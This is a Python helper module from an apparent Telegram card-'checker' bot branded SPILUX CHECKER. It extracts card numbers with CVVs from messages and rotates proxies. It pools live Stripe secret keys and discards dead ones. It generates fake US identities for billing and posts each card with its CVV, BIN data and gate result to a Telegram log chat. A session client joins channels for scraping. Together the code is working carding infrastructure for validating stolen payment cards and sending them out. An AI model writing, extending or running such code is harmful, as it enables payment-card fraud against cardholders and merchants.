import json
from FUNC.usersdb_func import *
from TOOLS.getbin import *
from CONFIG_DB import *
from mongodb import *

async def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end   = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None
    
async def result_logs(fullz , gate , result):
    try:
        with open("result_logs.txt", "a" , encoding="utf-8") as f:
            f.write(fullz + " - " + gate + " - " + result.text + "\n")
    except:
        pass
    

async def get_proxy_format():
    import random
    getproxy       = random.choice(open("FILES/proxy.txt", "r", encoding="utf-8").read().splitlines())
    proxy_ip       = getproxy.split(":")[0]
    proxy_port     = getproxy.split(":")[1]
    proxy_user     = getproxy.split(":")[2]
    proxy_password = getproxy.split(":")[3]
    proxies = {
        "https://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
        "http://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
    }
    return proxies


async def getmessage(message):
    try:
        try:
            msg = message.reply_to_message.text
        except:
            msg = message.text.split(" ")[1]
        validate_msg = await getcards(msg)
        if validate_msg != None:
            return validate_msg
        else:
            return False
    except:
        return False


async def getcards(lista):
    try:
        import re
        pattern = r'(\d{15,18})[\/\s:|-]*?(\d{1,2})[\/\s:|-]*?(\d{2,4})[\/\s:|-]*?(\d{3,4})'
        pips = re.findall(pattern, lista)
        return pips[0]
    except:
        return


async def sendcc(resp, session):
    try:
        import urllib.parse, json

        resp      = urllib.parse.quote_plus(resp)
        BOT_TOKEN = json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["BOT_TOKEN"]
        LOGS_CHAT = json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["LOGS_CHAT"]
        await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={LOGS_CHAT}&text={resp}&parse_mode=HTML")
    except:
        pass






async def addsk(SK):
    try:
        FIND_SK = BLACKLISTED_SKS.find_one({"id": SK}, {"_id": 0})

        if str(FIND_SK) != "None":
            for i in FIND_SK:
                if i in SK or i == SK:
                    return
        
        if "test" in SK or "pk_" in SK:
            return
        
        all_sk = await getallsk()

        for i in all_sk:
            if i in SK or i == SK:
                return

        INFO = {
            "id": SK,
        }
        SKS_DB.insert_one(INFO)
    except:
        import traceback
        await error_log(traceback.format_exc())


async def delsk(SK):
    try:
        FIND_SK = BLACKLISTED_SKS.find_one({"id": SK}, {"_id": 0})

        if str(FIND_SK) == "None":
        
            INFO = {
            "id": SK,
        }
            BLACKLISTED_SKS.insert_one(INFO)

        del_sk = {
            "id": SK,
        }
        SKS_DB.delete_one(del_sk)

    except:
        import traceback
        await error_log(traceback.format_exc())


async def getsk():
    import random

    sks = await getallsk()
    try:
        sk = random.choice(sks)
    except:
        sk = "sk_live_1234"
    return sk


async def getallsk():
    sks = []
    find = SKS_DB.find({}, {"_id": 0})
    for i in find:
        sks.append(i["id"])

    if len(sks) == 0:
        return ["sk_live_1234"]
    else:
        return sks


async def forward_resp(fullz, gate, response):
    try:
        import httpx
        import urllib.parse
        import json
        session           = httpx.AsyncClient( timeout = 30 )
        cc, mes, ano, cvv = fullz.split("|")
        fbin              = cc[:6]
        getbin            = await get_bin_details(cc)
        brand             = getbin[0]
        type              = getbin[1]
        level             = getbin[2]
        bank              = getbin[3]
        country           = getbin[4]
        flag              = getbin[5]
        currency          = getbin[6]

        resp = f"""<b>Gate: {gate} ✅
CC: <code>{cc}|{mes}|{ano}|{cvv}</code>
Result: {response}
BIN: #bin_{fbin} - {brand} - {type} - {level}
Bank: {bank} 
Country: {country} - {flag} - {currency}
</b>"""
        resp      = urllib.parse.quote_plus(resp)
        BOT_TOKEN = json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["BOT_TOKEN"]
        LOGS_CHAT  = json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["LOGS_CHAT"]
        await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={LOGS_CHAT}&text={resp}&parse_mode=HTML")
        await session.aclose()
    except:
        import traceback
        await error_log(traceback.format_exc())


async def error_log(log_message):
    try:
        with open("error_logs.txt", "a" , encoding="utf-8") as file:
            file.write(str(log_message) + "\n")
    except:
        pass


async def get_token(TOKEN_NAME):
    try:
        FIND_TOKEN = TOKEN_DB.find_one({"id": TOKEN_NAME}, {"_id": 0})
        if str(FIND_TOKEN) == "None":
            INFO = {
                "id": TOKEN_NAME,
                "token": "N/A",
                "status": "N/A",
            }
            TOKEN_DB.insert_one(INFO)
            return "N/A"
        else:
            return FIND_TOKEN["token"]
    except:
        import traceback
        await error_log(traceback.format_exc())
        return "N/A"


async def update_token(TOKEN_NAME , TOKEN):
    TOKEN_DB.update_one({"id": TOKEN_NAME} , {"$set": {"token": TOKEN, "status": "UPDATED"}})


async def update_api_token(TOKEN_NAME , TOKEN):
    TOKEN_DB.update_one({"id": TOKEN_NAME} , {"$set": {"api_key": TOKEN}})


async def send_alert_to_admin(TOKEN_NAME):
    try:
        import urllib.parse, json , httpx

        find = TOKEN_DB.find_one({"id": TOKEN_NAME}, {"_id": 0})
        if find["status"] == "UPDATED":
            resp = f"""
<b>Token Update Required ⚠️
━━━━━━━━━━━━━━
Dear 𝐒𝐏𝐈𝐋𝐔𝐗 𝐂𝐇𝐄𝐂𝐊𝐄𝐑  , 
Your {TOKEN_NAME} Expired . To Make it working again , it needs to update .

Please Update {TOKEN_NAME} As Soon As Possible ❤️</b>"""

            resp      = urllib.parse.quote_plus(resp)
            BOT_TOKEN = json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["BOT_TOKEN"]
            OWNER_ID  = json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["OWNER_ID"]
            session   = httpx.AsyncClient()
            await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={OWNER_ID}&text={resp}&parse_mode=HTML")
            await session.aclose()
            TOKEN_DB.update_one({"id": TOKEN_NAME} , {"$set": {"status": "EXPIRED"}})

    except:
        import traceback
        await error_log(traceback.format_exc())


async def check_member_participation( chat_id , user_id , bot ):
    try:
        from pyrogram import errors
        user_id = int(user_id)
        await bot.get_chat_member(chat_id, user_id)
        return True
    
    except errors.exceptions.bad_request_400.UserNotParticipant:
        return False
    
    except:
        return False


async def get_random_info(session):
    try:
        import random
        async def get_state_abbreviation(state_name):
            state_dict = {
            "Alabama": "AL",
            "Alaska": "AK",
            "Arizona": "AZ",
            "Arkansas": "AR",
            "California": "CA",
            "Colorado": "CO",
            "Connecticut": "CT",
            "Delaware": "DE",
            "Florida": "FL",
            "Georgia": "GA",
            "Hawaii": "HI",
            "Idaho": "ID",
            "Illinois": "IL",
            "Indiana": "IN",
            "Iowa": "IA",
            "Kansas": "KS",
            "Kentucky": "KY",
            "Louisiana": "LA",
            "Maine": "ME",
            "Maryland": "MD",
            "Massachusetts": "MA",
            "Michigan": "MI",
            "Minnesota": "MN",
            "Mississippi": "MS",
            "Missouri": "MO",
            "Montana": "MT",
            "Nebraska": "NE",
            "Nevada": "NV",
            "New Hampshire": "NH",
            "New Jersey": "NJ",
            "New Mexico": "NM",
            "New York": "NY",
            "North Carolina": "NC",
            "North Dakota": "ND",
            "Ohio": "OH",
            "Oklahoma": "OK",
            "Oregon": "OR",
            "Pennsylvania": "PA",
            "Rhode Island": "RI",
            "South Carolina": "SC",
            "South Dakota": "SD",
            "Tennessee": "TN",
            "Texas": "TX",
            "Utah": "UT",
            "Vermont": "VT",
            "Virginia": "VA",
            "Washington": "WA",
            "West Virginia": "WV",
            "Wisconsin": "WI",
            "Wyoming": "WY"
        }
            state_name = state_name.title()
            if state_name in state_dict:
                return state_dict[state_name]
            else:
                return "NY"
        result      = await session.get("https://randomuser.me/api/?nat=us")
        data        = result.json()
        first_name  = data['results'][0]['name']['first']
        last_name   = data['results'][0]['name']['last']
        email       = first_name + last_name + str(random.randint(1, 100000)) + "@gmail.com"
        email       = email.replace(" ", "")
        phone       = (str(random.randint(220, 820)) + str(random.randint(100, 999)) + str(random.randint(1000, 9999)))
        add1        = str(data['results'][0]['location']['street']['number']) + ' ' + data['results'][0]['location']['street']['name']
        city        = data['results'][0]['location']['city']
        state       = data['results'][0]['location']['state']
        state_short = await get_state_abbreviation(state)
        zip_code    = data['results'][0]['location']['postcode']
    except:
        first_name  = "Alex"
        last_name   = "Smith"
        email       = "alexsmith" + str(random.randint(1, 100000)) + "@gmail.com"
        phone       = (str(random.randint(220, 820)) + str(random.randint(100, 999)) + str(random.randint(1000, 9999)))
        add1        = "17 East 73rd Street"
        city        = "New York"
        state       = "NY"
        state_short = "NY"
        zip_code    = "10021"
        
    json = {
        "fname": first_name,
        "lname": last_name,
        "email": email,
        "phone": phone,
        "add1": add1,
        "city": city,
        "state": state,
        "state_short": state_short,
        "zip": zip_code
    }
    return json












async def sendsk(resp, session):
    try:
        import urllib.parse
        import json

        resp = urllib.parse.quote_plus(resp)
        BOT_TOKEN = json.loads(
            open("FILES/config.json", "r", encoding="utf-8").read())["BOT_TOKEN"]
        # LOGS_CHAT = json.loads(
        #     open("FILES/config.json", "r", encoding="utf-8").read())["LOGS_CHAT"]
        await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id=&text={resp}&parse_mode=HTML")
    except:
        pass


# Channel Management Functions
async def record_channel_join(channel_id, channel_title, invite_link=None, requested_by=None):
    """
    Record a channel that was joined for scraping purposes.
    This helps track which channels need to be left later.
    """
    try:
        from CONFIG_DB import CHANNELS_DB
        from datetime import datetime
        
        # Check if this channel is already in our database
        existing = CHANNELS_DB.find_one({"channel_id": channel_id})
        
        if existing:
            # Update the existing record
            CHANNELS_DB.update_one(
                {"channel_id": channel_id},
                {"$set": {
                    "join_time": datetime.now(),
                    "left_channel": False,
                    "requested_by": requested_by
                }}
            )
        else:
            # Create a new record
            CHANNELS_DB.insert_one({
                "channel_id": channel_id,
                "channel_title": channel_title,
                "invite_link": invite_link,
                "join_time": datetime.now(),
                "requested_by": requested_by,
                "left_channel": False,
                "leave_attempts": 0,
                "last_leave_attempt": None
            })
        return True
    except Exception as e:
        await error_log(f"Failed to record channel join: {str(e)}")
        return False


async def update_channel_leave_status(channel_id, success=False):
    """
    Update the channel status after an attempt to leave it.
    """
    try:
        from CONFIG_DB import CHANNELS_DB
        from datetime import datetime
        
        if success:
            # Mark as successfully left
            CHANNELS_DB.update_one(
                {"channel_id": channel_id},
                {"$set": {"left_channel": True}}
            )
        else:
            # Increment the attempt counter
            CHANNELS_DB.update_one(
                {"channel_id": channel_id},
                {
                    "$inc": {"leave_attempts": 1},
                    "$set": {"last_leave_attempt": datetime.now()}
                }
            )
        return True
    except Exception as e:
        await error_log(f"Failed to update channel status: {str(e)}")
        return False


async def get_client_with_session():
    """
    Get a Telegram client initialized with the session string from config.
    Uses a connection pooling strategy to reuse client instances when possible.
    
    Returns:
        pyrogram.Client: An initialized Telegram client, or None if failed
    """
    try:
        import json
        import asyncio
        from pyrogram import Client
        
        # Check if we have a global client instance that can be reused
        global _session_client_instance
        global _session_client_last_used
        
        current_time = asyncio.get_event_loop().time()
        
        # If we have a recent client instance, return it
        if globals().get('_session_client_instance') and globals().get('_session_client_last_used'):
            # Reuse the client if it was used in the last hour and is still connected
            if (current_time - _session_client_last_used < 3600 and 
                    hasattr(_session_client_instance, 'is_connected') and 
                    _session_client_instance.is_connected):
                # Update the last used timestamp
                _session_client_last_used = current_time
                return _session_client_instance
        
        # Otherwise, create a new client
        with open("FILES/config.json", "r", encoding="utf-8") as f:
            config = json.load(f)
            API_ID = config.get("API_ID")
            API_HASH = config.get("API_HASH")
            SESSION_STRING = config.get("SESSION_STRING")
        
        if not SESSION_STRING or SESSION_STRING == "YOUR_SESSION_STRING_HERE":
            await error_log("No valid SESSION_STRING found in config")
            return None
            
        # Create a new client instance
        client = Client(
            "Scrapper", 
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=SESSION_STRING,
            no_updates=True  # Don't receive updates for this client, we only use it for API calls
        )
        
        # Store the client for potential reuse
        globals()['_session_client_instance'] = client
        globals()['_session_client_last_used'] = current_time
        
        return client
    except Exception as e:
        await error_log(f"Failed to initialize client with session: {str(e)}")
        return None


async def validate_session(client=None):
    """
    Validate if the current session is working properly.
    Returns (success, message) tuple.
    """
    close_after = False
    try:
        if client is None:
            client = await get_client_with_session()
            close_after = True
            
        if not client:
            return False, "Failed to initialize client"
            
        # Start the client if it's not already started
        if not client.is_connected:
            await client.start()
            
        # Try to get information about yourself
        me = await client.get_me()
        if not me:
            return False, "Could not retrieve user information"
            
        # Try to get a dialog to verify API access
        dialogs = await client.get_dialogs(limit=1)
        if dialogs is None:
            return False, "Could not retrieve dialogs"
            
        # Success!
        return True, f"Session valid for user {me.first_name} (@{me.username})"
    except Exception as e:
        return False, f"Session validation failed: {str(e)}"
    finally:
        # Make sure to clean up
        if close_after and client and client.is_connected:
            await client.stop()

